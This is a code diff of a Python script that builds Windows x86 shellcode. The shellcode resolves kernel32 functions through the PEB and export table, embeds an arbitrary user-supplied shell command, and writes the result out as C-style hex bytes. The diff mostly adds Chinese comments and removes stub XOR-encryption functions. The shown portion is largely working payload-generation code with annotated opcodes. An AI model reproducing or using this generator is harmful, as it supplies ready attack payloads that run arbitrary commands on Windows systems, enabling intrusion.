@@ -5,6 +5,8 @@ import optparse
 import os
 
 def getshellcode(cmdline):
+
+	# 补齐 \x00 字符
 	locallist = ''
 	for i in cmdline:
 		locallist += str(hex(ord(i)))[2:]
@@ -15,21 +17,19 @@ def getshellcode(cmdline):
 		cmdline += '00' * (8 - lastdata)
 
 	shellcode =  ''
-	shellcode += '64A130000000'  # mov eax, dword ptr fs:[0x00000030]        
-	shellcode += '8B400C'        # mov eax, dword ptr ds:[eax+0xC]      
+	shellcode += '64A130000000'  # mov eax, dword ptr fs:[0x00000030]
+	shellcode += '8B400C'        # mov eax, dword ptr ds:[eax+0xC]
 	shellcode += '8B400C'        # mov eax, dword ptr ds:[eax+0xC]
 	shellcode += '8B00'          # mov eax, dword ptr ds:[eax]
 	shellcode += '8B00'          # mov eax, dword ptr ds:[eax]
 	shellcode += '8B4018'        # mov eax, dword ptr ds:[eax+0x18]
 	shellcode += '8BE8'          # mov ebp, eax
-
-	shellcode += '368B453C'      # mov eax, dword ptr ss:[ebp+0x3C] 
+	shellcode += '368B453C'      # mov eax, dword ptr ss:[ebp+0x3C]
 	shellcode += '3E8B542878'    # mov edx, dword ptr ds:[eax+ebp*1+0x78]
-	shellcode += '03D5'          # add edx, ebp                                   #edx=export table
-	shellcode += '3E8B4A18'      # mov ecx, dword ptr ds:[edx+0x18]               #ecx=NumberOfFunctions
-	shellcode += '3E8B5A20'      # mov ebx, dword ptr ds:[edx+0x20]               
-	shellcode += '03DD'          # add ebx, ebp                                   #ebx=AddressOfName
-
+	shellcode += '03D5'          # add edx, ebp
+	shellcode += '3E8B4A18'      # mov ecx, dword ptr ds:[edx+0x18]
+	shellcode += '3E8B5A20'      # mov ebx, dword ptr ds:[edx+0x20]
+	shellcode += '03DD'          # add ebx, ebp
 	shellcode += '49'            # dec ecx
 	shellcode += '3E8B348B'      # mov esi, dword ptr ds:[ebx+ecx*4]
 	shellcode += '03F5'          # add esi, ebp
@@ -55,6 +55,7 @@ def getshellcode(cmdline):
 	shellcode += 'FFD3'          # call ebx
 	shellcode += '6A00'          # push 0
 
+	# 将 shell 命令插入到汇编代码
 	result = []
 	length = len(cmdline) / 8
 	pushlist = []
@@ -98,39 +99,28 @@ def getshellcode(cmdline):
 	# 6A0068657373006850726F6368457869745455FFD3
 	return shellcode
 
-# xor encryption
-def encryption(param):
+# 转换为 c 语言识别的 hex 字符
+def convert(hexdata):
 	data = ''
-	return data
-
-# out \x00
-def outnull(param):
-	data = ''
-	return data
-
-# c-code
-def convert(param):
-	data = ''
-	length = len(param) / 2
+	length = len(hexdata) / 2
 	for i in range(length):
 		data += '\\x'
-		data += param[i*2: i*2+2]
+		data += hexdata[i*2: i*2+2]
 	return data
 
+# 输出为文件
 def outputfile(filepath, cmdline):
 	hexdata = ''
 	hexdata = getshellcode(cmdline)
-	#with open("test", 'wb') as writefile:
-		#writefile.write(hexdata.decode('hex'))
 
 	length = len(hexdata)
 	hexdata = convert(hexdata)
 	with open(filepath, 'wb') as writefile:
 		writefile.write(hexdata)
 
-	#print(hexdata)
-	#print("[*] shellcode file is create already, shellcode size is: " + str(length) + "bytes")
-	#execshellcode(os.getcwd() + "\\Execshellcode")
+	print(hexdata)
+	print("[*] shellcode file is create already, shellcode size is: " + str(length) + "bytes")
+
 
 def main():
 	parse=optparse.OptionParser()  
